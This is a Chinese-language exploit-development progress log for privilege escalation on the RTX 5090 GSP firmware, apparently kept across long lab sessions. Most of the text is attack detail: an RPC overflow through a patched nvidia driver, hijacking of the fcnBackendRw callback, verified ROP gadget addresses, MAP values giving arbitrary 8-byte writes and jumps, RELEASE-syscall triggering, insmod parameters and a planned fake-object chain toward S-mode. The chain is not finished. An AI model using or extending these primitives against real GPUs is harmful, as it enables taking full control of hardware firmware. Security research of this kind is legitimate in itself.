# ═══════════════════════════════════════════════════════════════
#
#  GSP LibOS 提权研究 — 权威进度文件 v2
#  此文件为唯一权威参考, 覆盖所有旧文档
#
#  最后更新: 2026-10-13 11:00
#  会话跨度: 2026-10-10 21:00 ~ 2026-10-13 11:00 (约62小时)
#  环境: RTX 5090 (GB202) / VM实验室 / nvidia 610.57.04 / v22模块
#
# ═══════════════════════════════════════════════════════════════

---

## 一、项目目标

在RTX 5090的GSP芯片(RISC-V处理器)上, 将RM任务从U-mode提升到LibOS内核的S-mode, 获得对GPU的完全控制。

## 二、攻击总架构

```
宿主Linux(root)
  └── nvidia.ko (v22修改版, 参数化溢出)
        └── RPC通信 (SYSMEM共享内存)
              └── GSP芯片 (RISC-V RV64GC)
                    ├── M-mode: BootROM (已跑完)
                    ├── S-mode: LibOS 3.1 内核 (逆向完成)
                    └── U-mode: RM任务 (我们的攻击目标)
                          ├── RPC泵 (消息处理循环)
                          ├── msgq库 (队列管理)
                          └── 各种RM子系统
```

## 三、已确认的原语 (全部真机验证)

### 3.1 RPC溢出 (K=33)
- 谎报33个元素(实际1个) → 溢出到metadata+相邻堆
- v21 MAP机制: 精确控制元素32内每4字节
- v22新增: `xdig_meta_only=1` → 只溢出metadata(232B), 不碰相邻堆

### 3.2 回调劫持 (+0xb8)
- metadata+0xb8是`fcnBackendRw`函数指针
- 覆盖它 = 执行任意RM固件地址
- `a1`参数 = `[metadata+0x38]` (通过MAP控制)

### 3.3 黄金gadget双路
```
golden gadget @ 0x010C1D66:
  c.mv s10, a1       ← s10 = a1 (受控)
  c.beqz a5, +0x68   ← 分支
  [a5≠0] ld a5, 0x2c0(a1)  ← 正常路径, MAP key 0x103C0
  [a5==0] → 0x10C1DD0路径, MAP key 0x103B8
  c.jalr a5           ← 跳转
```

### 3.4 任意字节写入 ★★★★
```
链: golden → load_gadget(0x0176BC1C) → write_syscall(0x01DE3A1A)

load_gadget:
  ld a5, -0x340(s1)    ← 跳转目标 (MAP key 0xFCC0)
  lbu a1, 0x689(s1)    ← 写入值! 1字节 (MAP key 0x10688, byte1)
  ld a0, -0x138(s0)
  c.jalr a5             ← 跳到write gadget

write_syscall:
  c.sw a1, 0x10(a3)    ← ★ 写入! [a3+0x10] = a1 (32位)
  c.unimp               ← syscall(安全, 任务不死)

MAP控制:
  地址(a3): MAP key 0x10010 ← 完全受控!
  值(a1):   MAP key 0x10688 ← 受控(单字节, zero-extend)
```

### 3.5 真机写入验证
| 目标 | 地址 | 结果 |
|------|------|------|
| MQI staging ptr | 0x4191668 | ✅ LOCKDOWN(写入成功) |
| port+0x30 (callback) | 0x0C200FF8 | ✅ LOCKDOWN(写入成功) |
| syscall表 | 0x0A3008283 | ✅ 写入"成功"但去了零页 |
| port+0x33 (不对齐) | 0x0C200FFB | ❌ STORE FAULT(需4字节对齐) |

### 3.6 存活原语
- 自循环(0x01C9A7CC)挂+0xb8 → 任务不死(LOCKDOWN)
- t0=15 SBI阻塞 → S-mode执行
- t0=6 timer → 保证返回的syscall

## 四、内存布局 (从模拟器PMP窗口+实测)

```
物理地址空间:
  0x00000000-0x00FFFFFF   BootROM/硬件寄存器
  0x01000000-0x01E68FFF   RM固件(17MB, RX) ← gadget源
  0x0C200000-0x0C20FFFF   内核堆前半(port/句柄表) ← U-mode RW!
  0x0DF35BC6xxxx           内核堆对象(RELEASE目标)
  0x0FCDCBD8xxxx           更多内核堆
  0x0FE4770E10             ★ STAGING AREA ★
    +0x00000  RX staging 64KB (元素0-15)
    +0x10000  TX staging 64KB (元素16-31) ← 页头在这里!
    +0x20000  metadata 232B + 溢出区
  0x0FEB80Fxxxx            RM任务栈 (staging+112MB)
  0x0FEBC000000            线程控制块(tp)

内核虚拟地址(S-mode):
  0xFFFFFFFF93000000  内核代码
  0xFFFFFFFFA3000000  内核数据/类型表/syscall表

U-mode可写区域:
  ✅ 内核堆(0x0C20xxxx) — 已验证!
  ✅ MQI(0x419xxxx) — 已验证!
  ❌ syscall表区(0x0A30xxxx) — 零页映射!
  ❌ 内核私有(0xFFFFFFFF...) — 不可达!
```

## 五、C2攻击设计 (模拟器验证)

### 5.1 公式
```
TYPECALC: desc = [(obj & ~0xFFF) + 0x20]
  → diff = (desc - 0xFFFFFFFFA300A000) mod 2^64
  → type = low32( (diff>>3) × 0xCCCCCCCD )

RELEASE destroy路径:
  slot = TYPE_TABLE + type×40 + 8
  dtor = [slot]
  if dtor != 0: jalr dtor ← S-mode任意跳转!
```

### 5.2 攻击常数
```
poison desc = 0xFFFFFFFFE4780E78
  → type = 1745445571
  → slot = 0x0FE4780E80 ← 在staging TX内!
可写区共1644个可达slot
```

### 5.3 攻击路径(需要完成的部分)
1. 写假object指针到句柄表 → 指向staging
2. staging的页头 = 毒药值(通过MAP设置)
3. t0=2 RELEASE假对象 → TYPECALC读毒药页头
4. jalr到staging slot → S-MODE!

## 六、内核syscall分析

### 6.1 t0=0 (port操作)
- a1=0路径: 读port, 检查callback([port+0x30])
- callback=NULL → 跳到句柄表查找 → 页错误
- callback≠NULL → 写port字段 + 调用callback
- refcount increment在0x930035C8(被页错误阻断)

### 6.2 t0=2 (RELEASE)
- 搜索type=2条目 → 获取链表头 → UNLINK + DESTROY
- UNLINK做两个内核写: [prev+8]=next, [next]=prev
- 被垃圾指针阻断(crash at 0x18c09c8)

### 6.3 t0=6 (timer)
- [global+0x458] += 0xF42400
- 不碰RM栈, 不走unlink, 保证返回 ✓

### 6.4 页错误根因
所有t0=0/t0=5路径的句柄表查找要写[sp+0x18](RM栈) → S-mode写U-mode页 → 页错误死循环

## 七、固件文件(关键!)

```
明文RM固件(可反汇编):
  /home/user/rt_5090_project/power_governor_reverse/gsp61057_rx_full.bin
  备份: /home/user/rt_5090_project/rm_fw_plaintext.bin
  大小: 15,298,560 bytes (14.6 MB)
  加载基址: 0x1000000

⚠️ gsp_ga10x.bin是加密签名的容器(84MB)!
  不能直接反汇编!
  所有gadget搜索必须用rm_fw_plaintext.bin!

ELF section headers:
  .fwimage: addr=0x0, offset=0x40, size=0x505B000(82MB)
  (但只有前15MB是明文RM代码)
```

## 八、关键Gadget地址表 (从明文固件验证)

```
golden gadget        = 0x010C1D66  ✓已验证
T3 (a5+a3 loader)    = 0x01106D12  ✓已验证
T4                   = 0x0160C3C0  ✓已验证
write_syscall        = 0x01DE3A1A  ✓已验证(c.sw+unimp)
write_return         = 0x01165C1A  ✓已验证(c.sw+jr ra)
load_gadget(1byte)   = 0x0176BC1C  ✓已验证(ld a5+lbu a1+jalr)
safe_ret             = 0x0100DCBA
自循环                = 0x01C9A7CC  ✓已验证
read-gadget          = 0x01020A30  ✓已验证
t0=6 wrapper         = 0x01E1D7F0
t0=8 wrapper         = 0x01A9E45C
t0=15 wrapper        = 0x01A9E5D2
```

## 九、VM实验室操作

### 9.1 启动脚本
```bash
sudo ~/rt_5090_project/k61_start.sh        # VFIO+QEMU
sleep 200  # VM boot
# SSH自动通(DHCP已配置)
```

### 9.2 射击脚本
```bash
# 标准射击(VM重启, ~5分钟)
/home/user/rt_5090_project/k61_shot.sh "MAP" "标签"

# 快速射击(GPU reset, ~90秒) — 实验中
/home/user/rt_5090_project/k61_fast_shot.sh "MAP" "标签"
```

### 9.3 v22驱动参数
```bash
insmod nvidia.ko xdig_k=33 xdig_ck=1 xdig_fn=76 xdig_firen=50 \
  xdig_meta_only=1 \
  xdig_map="0x100a4:1,0x100b8:0x...,0x100bc:0,..."
```

### 9.4 实验纪律
- 绝不`rmmod -f`
- 每次实验后: rmmod → GPU reset → 重insmod
- 禁止写BIOS/熔丝/InfoROM
- MODS不再使用(会杀GPU且不必要)

## 十、当前瓶颈与下一步

### 10.1 核心瓶颈
**只能写1个字节/次boot, 且boot后写入丢失。**

- 任意地址字节写入 ✓ 已验证
- 但写多字节值(如假object指针)需要多次写入
- 每次VM/GPU重启清除之前的写入

### 10.2 已尝试的解决方案

| 方案 | 结果 | 原因 |
|------|------|------|
| A: 回调返回+多RPC | v22 meta_only后泵仍死 | metadata篡改本身就杀泵 |
| B: 改v21驱动直接写 | v22构建成功但不够 | 需要解决metadata恢复 |
| C: 32位值gadget | 搜索完毕,不存在 | 固件中无a1+a3双加载+jalr |
| D: syscall表修改 | 写入去了零页 | syscall表区U-mode不可写 |

### 10.3 下一步方向(按优先级)

**1. Metadata恢复 + 回调返回 (路径A深化)**
- 回调用完后恢复metadata原值
- 需要知道metadata的"正确"值(可通过HOST侧dump获取)
- 恢复后泵继续 → 下一个RPC → 再写入!
- 这是最根本的解决方案

**2. 句柄表假对象(需要多字节写入)**
- 需要写8字节假object指针到句柄表
- 只有获得多字节写入能力后才能做
- 获得后: 假对象指向staging → 页头毒药 → C2 → S-mode

**3. 利用port callback(需要激活t0=0写入)**
- 写1字节到port+0x30 → callback非NULL
- 下一个t0=0 syscall会写port+0x38/+0x40(a2/a3, 64位!)
- 但需要t0=0恰好被触发(不可控)

## 十一、v22驱动源码位置

```
v22补丁器(自包含): /home/user/rpc_ovf_patch_v22_complete.py
干净源码:
  MQ: /home/user/nvidia-live-recovery-lab/greenfield/open-gpu-kernel-modules/src/nvidia/src/kernel/gpu/gsp/message_queue_cpu.c
  nv.c: /home/user/nvidia-live-recovery-lab/greenfield/open-gpu-kernel-modules/kernel-open/nvidia/nv.c

VM内:
  源码: /usr/src/nvidia-610.57.04/
  DKMS: 已构建并安装(v22, 11个xdig参数)
```

## 十二、文件位置速查

```
权威进度文件(本文件): ~/rt_5090_project/★AUTHORITATIVE_PROGRESS_v2_20261013.md
旧权威文件(附录A-J): ~/rt_5090_project/★AUTHORITATIVE_PROGRESS_20261011.md
明文固件:           ~/rt_5090_project/rm_fw_plaintext.bin
内核反汇编:         ~/rt_5090_project/kernel_gb20x_disasm.txt
内核ELF(模拟器用):  ~/rt_5090_project/emu_bench/kernel_gb20x_REAL.elf
RV64模拟器:         ~/rt_5090_project/rv64_emu.py
C2验证脚本:         ~/rt_5090_project/emu_bench/emu_c2_staging.py
v22补丁器:          ~/rt_5090_project/rpc_ovf_patch_v22_complete.py
射击脚本:           ~/rt_5090_project/k61_shot.sh
VM启动:             ~/rt_5090_project/k61_start.sh
VM串口初始化:       ~/rt_5090_project/k61_serial_init.sh
```

---

*本文件为唯一权威进度参考。所有之前文档以此为准。*
*下次开工: 直接读本文件, 按第十节优先级继续。*

---

# ═══════════════════════════════════════════════════════════════
# 附录K: 2026-10-13 下午会话新发现 (v3增量)
# ═══════════════════════════════════════════════════════════════

## K.1 ★★★ 回调完整参数表 (重大发现!) ★★★

泵调用fcnBackendRw的RISC-V寄存器映射(来自msgq.c源码分析):
```
a0 = pVal (值指针,不控)
a1 = pAddr = [metadata+0x38] ← MAP key 0x10038 完全受控!
a2 = size (=4,不控)
a3 = direction (=0 READ,已验证: stval=0)
a4 = fcnBackendRwArg = [metadata+0xC0] ← MAP key 0x100C0 完全受控!
```

## K.2 8字节写入gadget
```
0x010F3EF0: c.sd a4, 0(a1); c.jr ra
= 写8字节(a4)到[a1] + 干净返回到泵!
a1=地址(MAP 0x10038), a4=值(MAP 0x100C0)
```

## K.3 msgqMetadata完整布局(232字节)
```
+0x00 pOurTxHdr      (ptr)
+0x08 pTheirTxHdr    (ptr)
+0x10 pOurRxHdr      (ptr)
+0x18 pTheirRxHdr    (ptr)
+0x20 pOurEntries    (ptr)
+0x28 pTheirEntries  (ptr) = 0x0FE4790CD0 ✓
+0x30 pReadIncoming  (ptr) = 0x0FE4790CD8 (推断)
+0x38 pWriteIncoming (ptr) = 0x0FE4790CE0 ✓
+0x40 pReadOutgoing  (ptr) = 0x0FE4790CE8 (推断)
+0x48 pWriteOutgoing (ptr) = 0x0FE4790CF0 (推断)
+0x50-0x78 tx区域    (header+counters+txLinked@+0x78)
+0x7C-0xA4 rx区域    (header+counters+rxLinked@+0xA4)
+0xA8 fcnNotify      "MarkConsumed" (ptr, NULL-safe)
+0xB0 fcnNotifyArg   (ptr)
+0xB8 fcnBackendRw   ★回调指针★
+0xC0 fcnBackendRwArg ★=a4,受控!★
+0xC8 fcnInvalidate  (NULL-safe)
+0xD0 fcnFlush       (NULL-safe)
+0xD8 fcnZero        (NULL-safe)
+0xE0 fcnBarrier     (NULL-safe)
```
所有函数指针都有NULL检查(msgq.c源码确认)。

## K.4 关键实验结果(2026-10-13下午)

| 实验 | 结果 | 结论 |
|------|------|------|
| +0xb8=write_return(a3版) | sepc=write_return, stval=0 | a3=0在回调入口 |
| +0xb8=c.sd a4,0(a1) | 无fault, PUMP_DEAD | 8字节写执行成功 |
| rxLinked=0+NULL回调 | Xid119 timeout | 泵挂起(非crash) |
| epilogue=回调 | 无timeout, RPC 65 stuck | epilogue返回但跳过响应生成 |
| 自引用写(0x1000到回调) | 无第二次crash | 回调只调1次/消息 |
| C2句柄表攻击 | LOCKDOWN 16, 无S-mode | t0=2未触发 |

## K.5 泵挂起根因分析
- 溢出将metadata的232字节大部分清零
- 结构指针(pOurTxHdr等10个)全零 → 泵NULL deref挂起
- 函数指针零化是安全的(NULL check)
- 需要恢复结构指针才能让泵存活

## K.6 msgqInit在固件中的位置
```
0x0109758C: msgqInit简易版
0x010976E0: msgqInit完整版
  - s2 = config, s1 = metadata
  - 函数指针从[s2+0x270]等getter调用获得
  - 结构指针由调用者设置(未找到确切代码)
```

## K.7 下一步优先级
1. **验证a4受控性** — 改v22加读回功能,或找到可观测写入效果
2. **找t0=2 wrapper** — c.li t0,2; c.unimp → 在回调链内直接触发RELEASE
3. **恢复metadata** — 逆向msgqInit指针初始化,让泵存活
4. **完整C2** — 写假对象+t0=2触发+S-mode执行


---

# ═══════════════════════════════════════════════════════════════
# 附录L: 晚间会话补充 (2026-10-13 18:00-22:00)
# ═══════════════════════════════════════════════════════════════

## L.1 完整链验证成功!
```
golden(0x10C1D66) → 新gadget(0x015015F6) → write(0x010F3EF0)
执行流确认: sepc=0 (链执行完毕,epilogue返回到0)

新gadget代码:
  ld a5, 0x238(s1)    ← MAP 0x10238 = 写gadget
  c.beqz a5, 8          ← skip if 0
  ld a1, 0x240(s1)    ← MAP 0x10240 = 写入地址!
  c.jalr a5             ← 跳转执行
后续continuation: 清零+epilogue→返回到[sp+0x18]=0→crash at 0
```

## L.2 t0=2 wrapper发现!
```
0x01A96F56: c.li t0,2; c.unimp        ← 最简!直接触发RELEASE
0x01E51AB6: c.li t0,2; c.unimp×3      ← 3连syscall
0x01AA13A2: c.li t0,2; c.li a0,2; c.li a1,-1; c.unimp  ← 带参数
共7个c.li t0,2位置,3个带unimp
```

## L.3 MQI验证结论
```
GSP的MQI(0x41914D0) ≠ host的pMQI(kernel VA 0xffff89b98202c400)
GSP写0x4191668不影响host读回值 → GSP MQI在GSP私有内存
→ 无法通过host读回验证GSP侧写入
→ 只能通过GSP行为变化(crash pattern)间接验证
```

## L.4 链条设计冲突分析
```
核心问题: a1的双重角色
  golden需要a1做基址([a1+0x2C0]加载跳转目标)
  write需要a1做写入地址(c.sd a4,0(a1))
  
解决方案: 新gadget(0x015015F6)独立加载a1和a5
  MAP 0x102C0 = 新gadget地址(golden跳到这里)
  MAP 0x10238 = 写gadget(新gadget的a5)
  MAP 0x10240 = 目标地址(新gadget的a1)
  
写完后: 新gadget的continuation清零+epilogue→返回到[sp+0x18]=0
→ 需要解决: 写完后的跳转要到达t0=2 wrapper
```

## L.5 下一步关键
1. **让链的终点到达t0=2 wrapper** — 写完假对象后触发RELEASE
   - 方案A: 找"write→c.li t0,2→c.unimp"组合(未找到)
   - 方案B: 写到[sp+0x18](泵栈上的epilogue返回地址)→epilogue返回到t0=2 wrapper
     需要知道pump sp的确切值(从crash dump获取)
   - 方案C: 两次fire(第一次写,第二次触发) — 泵挂起问题
   - 方案D: 找不返回的write gadget(直接fall到t0=2)

## L.6 v23驱动
```
v23 = v22 + MQI读回(安全偏移+0x198/+0x1A0/+0x1A8)
每次RPC发送时输出XDIG MQI RB日志
补丁器: /home/user/rpc_ovf_patch_v23.py
验证: strings nvidia.ko | grep "MQI RB" = 1
注意: 读+0x1B8会越界→内核panic→VM崩溃!(已修复)
```


---

# ═══════════════════════════════════════════════════════════════
# 附录M: 深夜会话突破 (2026-10-13 22:00-02:00)
# ═══════════════════════════════════════════════════════════════

## M.1 ★★★ 地址拆分发现 (影响所有之前的实验!) ★★★
```
MAP值是32位! 所有GSP地址(如0x0FE4791610)是40位!
写入0x0FE4791610 → 被截断/拒绝 → a4=0 → 跳到0!

正确格式(必须拆分):
  MAP 0x100C0 = 0xE4791610  (低32位)
  MAP 0x100C4 = 0x0000000F  (高32位=0xF)

验证: sepc=0x0FE4791610 精确命中staging+0x20800!
⚠️ 之前所有使用40位MAP值的实验全部无效!
```

## M.2 ★★★ a4完全受控确认 ★★★
```
实验: +0xb8 = 0x013B0D02 (c.jalr a4指令)
      MAP 0x100C0 = 0x1000
结果: sepc=0x1000 ← 精确匹配!
结论: a4 = [metadata+0xC0] = MAP key 0x100C0+0x100C4 ✓✓✓
      64位完全受控的JUMP和WRITE值!
```

## M.3 ★★★ t0=2 RELEASE从回调触发成功! ★★★
```
实验: +0xb8 = 0x01A96F56 (c.li t0,2; c.unimp)
结果: sepc=0x01A96F64, scause=0x4(misaligned load)
      Xid 120: GSP task exception!
      LOCKDOWN=8 (不同于通常的16!)
结论: 回调可以触发t0=2 syscall! ✓✓✓
      RELEASE搜索句柄表并执行!
```

## M.4 write+syscall链执行成功!
```
实验: +0xb8 = 0x01E5B6FE (c.sd a4,0(a1); c.unimp×3)
结果: sepc=0x01E5B70A(第二个write因a2=4 misaligned)
结论: 链条 = WRITE(成功!) → 3×SYSCALL(返回!) → 后续代码
      写执行✓, syscall返回✓, 但t0=泵的值(不是2)
```

## M.5 staging不可执行
```
实验: c.jalr a4 → staging+0x20800
结果: scause=0xC(instruction page fault) at staging地址
结论: staging是RW不是RWX, 不能直接执行代码
```

## M.6 当前完整状态
```
✓ 8字节任意写: +0xb8=0x010F3EF0, a1=地址(32位), a4=值(拆分64位)
✓ 任意跳转: +0xb8=0x013B0D02(c.jalr a4), a4=目标(拆分64位)
✓ t0=2触发: +0xb8=0x01A96F56(c.li t0,2;c.unimp)
✓ 写+syscall: +0xb8=0x01E5B6FE(写+3syscall, 但t0≠2)
✗ 写+t0=2组合: 不存在单个gadget
✗ 泵在fcnNotify前挂起: 写到fcnNotify后泵不调用它
✗ 泵的t0≠2: write+unimp的syscall不是RELEASE

核心差距: 需要在一次回调中先写假对象再触发t0=2
```

## M.7 下一步方案
```
A: t0_setter(0x013B0CF8) + write gadget组合
   t0_setter: t0=2, a4=write gadget → jump
   write gadget: 写(但a4=gadget地址=错值), c.unimp(t0=2!)
   → 写的值错但syscall对! 需要另一个a1来源

B: 找c.jalr a4后面紧跟c.li t0,2的位置(未找到)

C: 写到栈上的返回地址(需要知道pump sp)

D: 完整metadata恢复让泵存活→多次fire

E: 写到[global+0x50](句柄链表头)重定向到staging假链表
```

## M.8 关键MAP值速查(修正后)
```
staging_base = 0x0FE4770E10
metadata     = 0x0FE4790E10 (= staging+0x20000)
metadata+0xA8(fcnNotify) = 0x0FE4790EB8
metadata+0xB8(回调)      = 0x0FE4790EC8  
fake_obj     = 0x0FE4791310 (= staging+0x20500)
页头毒药      = staging+0x20210 (= MAP 0x10210)
dtor slot    = staging+0x10070 (= MAP 0x0070)
句柄表        = 0x0C200330 (32位,不需拆分!)

拆分规则: 0x0FE4xxxxxx → 低32=0xExxxxxxx, 高32=0xF
```


---

# ═══════════════════════════════════════════════════════════════
# 附录N: 完整攻击链打通! (2026-10-14 02:00-06:00)
# ═══════════════════════════════════════════════════════════════

## N.1 ★★★ 完整链执行确认! ★★★
```
链: t0_setter → T3 → s1-write+syscall → RELEASE处理器运行!

MAP:
  0x100b8 = 0x013B0CF8  (t0_setter: c.li t0,2 + c.jalr a4)
  0x100c0 = 0x01106D12  (a4=T3: ld a5,[s1+0x110]; c.ld a3,[s1+0xD0]; c.jalr a5)
  0x10110 = 0x01E679A6  (T3的a5: c.sd s1,0(a3); c.unimp!)
  0x100d0 = 0x0C200330  (T3的a3=句柄表地址)
  0xf210  = 毒药页头(在staging+0x1F210)

执行流(全部确认):
  1. t0_setter: t0=2! c.jalr a4 → T3
  2. T3: a5=0x01E679A6, a3=句柄表, c.jalr a5
  3. 写gadget: c.sd s1(metadata_base)到[句柄表] ★写入!
  4. c.unimp → SYSCALL(t0=2) ★RELEASE!
  5. RELEASE处理器运行(Xid 120证实!)
  6. 最终crash at 0x01E20490(syscall返回后的原函数代码)
```

## N.2 crash分析
```
sepc=0x01E20490: c.sdsp zero,0x1b8(sp)
前置: 0x01E20480 c.slli sp,4(错位解码)→sp破坏→栈写crash

这是syscall返回后执行原函数代码的crash,
不是RELEASE/TYPECALC的crash!

改变dtor值(MAP 0x0070)→crash不变 → TYPECALC没被执行
改变句柄表偏移(+0x08→+0x10)→crash不变 → 同上
结论: RELEASE没有找到/处理我们写入的条目
可能原因: 写入的字段不是"object pointer",
         或条目的type字段≠2(RELEASE搜索type=2)
```

## N.3 页头地址修正!
```
之前算错: 页头在staging+0x1FF20(MAP 0xFF20) ← 错!
正确计算: fake_obj=s1=0x0FE4790E10
  page = 0x0FE4790000 (清低12位0xE10)
  页头 = 0x0FE4790020 = staging+0x1F210
  MAP key = 0xF210 (不是0xFF20!)
```

## N.4 下一步: 找到正确的句柄表条目
```
RELEASE搜索type=2条目 → 找到才走UNLINK+DESTROY→TYPECALC

需要确定:
1. 句柄表条目的精确布局(type字段在哪个偏移)
2. 哪个条目有type=2
3. 该条目的object pointer在哪个偏移

方法:
A: 暴力扫描(写不同偏移看crash变化) — 每次实验6分钟
B: 用模拟器/反汇编分析t0=2 handler的搜索逻辑
C: 改用写入"type=2"到某个字段(但s1值太大不是2)
```

## N.5 今日最终状态
```
✓ 8字节任意写(需地址拆分)
✓ t0=2 RELEASE从回调触发(Xid 120)
✓ 完整链: 写→syscall→RELEASE处理器运行
✗ RELEASE未处理我们的假对象(句柄表布局问题)
✗ TYPECALC未触发
✗ S-mode执行未实现

距离S-mode: 只差正确的句柄表条目偏移!
```


---

# ═══════════════════════════════════════════════════════════════
# 附录O: a0参数攻击突破! (2026-10-14 06:00-10:00)
# ═══════════════════════════════════════════════════════════════

## O.1 ★★★ RELEASE的参数机制发现! ★★★
```
从emu_c2_staging.py分析:
  RELEASE(0xffffffff93005b26) 以a0为参数直接调用!
  call(RELEASE, [fobj], ...) → refcount[obj-8]-- → 0时TYPECALC→jalr!

t0=2 syscall的a0参数 = 对象指针!
之前失败原因: a0=s5/s2(泵的寄存器)=垃圾值
```

## O.2 s0≠metadata_base (重要发现!)
```
实验: load_gadget(0x0176BC1C) → c.jr a0(0x0103B914)
      MAP 0xFEC8 = fake_obj (期望a0=0x0FE4791310)
结果: sepc=0x20 (a0的实际值=0x20!)
结论: s0≠metadata_base, [s0-0x138]=0x20(某个大小字段)
     s1=metadata_base(已确认), s0=其他结构!
     
影响: load_gadget的a0加载(ld a0,-0x138(s0))不可控!
```

## O.3 ★★ a0从s1加载的gadget! ★★
```
0x01BC2CD2:
  ld a0, 0x138(s1)    ← a0 = [s1+0x138] = MAP 0x10138 可控!!
  c.li a2, 2           ← a2=2
  c.mv a1, s2
  call 0x01BC2B28      ← 函数处理a0!

实验: +0xb8=0x01BC2CD2, MAP 0x10138=fake_obj
结果: sepc=0xFFFFFFFFFFFFFFFE(-2)!
     函数在处理fake_obj!跳到-2=从fake_obj区域读的垃圾!
     
分析: 函数做 s1 = a0 + 0x1F8 (对象+0x1F8偏移)
     然后调用 0x01028FF0(a0=fake_obj+0x1F8)
     从fake_obj区域读函数指针(垃圾值-2)→跳!
```

## O.4 fake_obj结构需求
```
函数链: 0x01BC2CD2 → 0x01BC2B28 → 0x01028FF0
0x01BC2B28: s1 = fake_obj + 0x1F8 → 调用0x01028FF0
0x01028FF0: 处理[fake_obj + 0x1F8]区域

需要设置fake_obj结构(MAP key从0x10500开始):
  fake_obj = staging+0x20500 = MAP 0x10500区域
  fake_obj+0x1F8 = staging+0x206F8 = MAP 0x106F8
  
下一步: 反汇编0x01028FF0看它读什么字段,
        在MAP中设置正确的结构!
```

## O.5 今日最终攻击状态
```
最有效链: +0xb8 = 0x01BC2CD2
  a0 = MAP 0x10138 (完全受控!)
  函数处理a0(假对象)
  crash at -2 = 函数读到了假对象区域的数据!
  
距S-mode: 只需正确设置fake_obj结构!
  → 函数成功处理 → 内部release → TYPECALC → jalr dtor → S-MODE!
```


---

# ═══════════════════════════════════════════════════════════════
# 附录P: 最终状态 (2026-10-14 10:00)
# ═══════════════════════════════════════════════════════════════

## P.1 已验证的完整攻击原语清单
```
1. 任意8字节写:
   +0xb8 = 0x010F3EF0 (c.sd a4,0(a1); c.jr ra)
   a1 = MAP 0x10038(低32)+0x1003C(高32)
   a4 = MAP 0x100C0(低32)+0x100C4(高32)
   ★地址必须拆分! MAP值只能32位!

2. 任意跳转:
   +0xb8 = 0x013B0D02 (c.jalr a4)
   a4 = MAP 0x100C0+0x100C4 (64位拆分)

3. t0=2 RELEASE syscall:
   +0xb8 = 0x01A96F56 (c.li t0,2; c.unimp)
   ✓ Xid 120 确认触发!

4. 受控a0 + 函数调用:
   +0xb8 = 0x01BC2CD2 (ld a0,[s1+0x138]; c.li a2,2; call)
   a0 = MAP 0x10138+0x1013C (s1基址,可控!)
   ★ 函数会处理a0作为对象指针!

5. 写+syscall链:
   +0xb8 = 0x01E5B6FE (c.sd a4,0(a1); c.unimp×3)
   写完成 + 3个syscall(但t0=泵的值)
```

## P.2 关键地址/MAP速查
```
staging_base = 0x0FE4770E10 (低32=0xE4770E10, 高32=0xF)
metadata     = 0x0FE4790E10 (低32=0xE4790E10, 高32=0xF)

MAP keys:
  0x100b8 = 回调指针(fcnBackendRw)
  0x100C0/0x100C4 = a4 (第5参数,64位)
  0x10038/0x1003C = a1 (第2参数,64位)
  0x10138/0x1013C = 0x01BC2CD2的a0 (64位)
  0x10210/0x10214 = fake_obj页头(staging+0x20210)
  0x0070/0x0074 = dtor slot(staging+0x10070)
```

## P.3 关键寄存器状态(回调入口)
```
s0 ≠ metadata_base (具体值未知, [s0-0x138]=0x20)
s1 = metadata_base = 0x0FE4790E10 ★确认★
a0 = pVal (泵的栈地址)
a1 = pAddr = [metadata+0x38] ★受控★
a2 = 4 (size)
a3 = 0 (direction)
a4 = [metadata+0xC0] ★受控★
a5 = 泵的值(非零)
t0 = 泵的值(≠2)
```

## P.4 下一步优先级(继续时从这里开始!)
```
1. 反汇编0x01BC2B28调用的函数(0x01028FF0之前)
   - 搞清楚-2 crash的确切来源
   - 找到正确的函数入口(可能是RM的release wrapper)

2. 找"设a0 + t0=2 + c.unimp"的组合gadget
   - 0x01BC2CD2提供了a0控制
   - 需要在这之后设t0=2并c.unimp
   - 搜索: ld a0(s1) → c.li t0,2 → c.unimp

3. 备选: 用模拟器完整模拟回调执行链
   - rv64_emu.py + rm_fw_plaintext.bin
   - 验证每一步的寄存器状态
   - 精确定位-2的来源

4. 备选: 修复metadata让泵存活→multi-shot
   - s0的值: 需要从crash dump获取
```

## P.5 v23驱动状态
```
已安装: v23 = v22 + MQI读回(安全偏移)
源码: /usr/src/nvidia-610.57.04/ (VM内)
补丁器: /home/user/rpc_ovf_patch_v23.py
注意: v23的MQI读回用+0x198/+0x1A0/+0x1A8(安全)
     不要用+0x1B0(越界→内核panic!)
```


---

# ═══════════════════════════════════════════════════════════════
# 附录Q: a0参数机制破解 (2026-10-14 12:00)
# ═══════════════════════════════════════════════════════════════

## Q.1 a0不影响RELEASE — 关键发现!
```
实验: a0=fake_obj(0x0FE4791310) vs a0=0 vs refcount=1 vs refcount=0x1000
结果: 全部产生IDENTICAL crash (sepc=0x01DE5394, stval=0x01DE33DE, scause=0x6)

结论: t0=2 syscall的a0参数不被RELEASE使用!
     RELEASE通过句柄表搜索(type=2条目)获取对象
     a0可能是handle INDEX(小整数)或被完全忽略
```

## Q.2 发现的a0加载gadget(可用但需理解机制)
```
★ 0x01DE3362: c.ld a0,0x30(s1); c.unimp; c.unimp; c.li s4,9; jal a0,0x2000
★ 0x01D581CA: c.ld a0,0x78(s1); c.unimp×多连发
★ 0x01C54FB0: c.ld a0,8(a4); c.unimp
★ 0x01E4B2F6: c.ld a0,0x48(a4); c.unimp×3
★ 0x01E4884E: c.ld a0,0x20(a4); c.unimp×3
```

## Q.3 0x01DE3362的后续分析
```
0x01DE3362: c.ld a0, 0x30(s1)   ← a0 from MAP 0x10030
0x01DE3364: c.unimp              ← SYSCALL(t0=2)!
0x01DE3366: c.unimp              ← SYSCALL
0x01DE3368: c.li s4, 9
0x01DE336A: jal a0, 0x2000      ← 跳到a0+0x2000=0x01DE536A
...
0x01DE5394: (crash—misaligned store)

crash在jal后的代码,与syscall结果无关
```

## Q.4 真正的攻击机制(更新理解)
```
t0=2 RELEASE流程(内核):
1. 搜索句柄表([global+0x50]链表)找type=2条目
2. 找到→UNLINK([prev+8]=next, [next]=prev)
3. DESTROY: refcount[obj-8]-- → 0时TYPECALC
4. TYPECALC: desc=[(obj&~0xFFF)+0x20] → type → slot → dtor → jalr

我们控制的是staging(页头+dtor slot)
但RELEASE用的是句柄表中找到的obj指针(内核堆)

需要:
A. 写假obj指针到句柄表(需要8字节写)
B. 同时设该条目type=2(需要另一个写)
C. 触发t0=2(需要syscall gadget)

三次操作,一个回调!→需要更长的gadget链
```

## Q.5 完整攻击需要的gadget链
```
理想: t0_setter(t0=2) → 写type=2 → 写obj指针 → c.unimp
或:  写type=2 → 写obj → t0_setter → c.unimp
或:  利用0x01D581CA的多连发c.unimp特性

搜索目标:
- c.sd t0,0(a3);c.unimp (t0=2时写2到[a3]=type字段!)
- 双写gadget(两个不同目标)
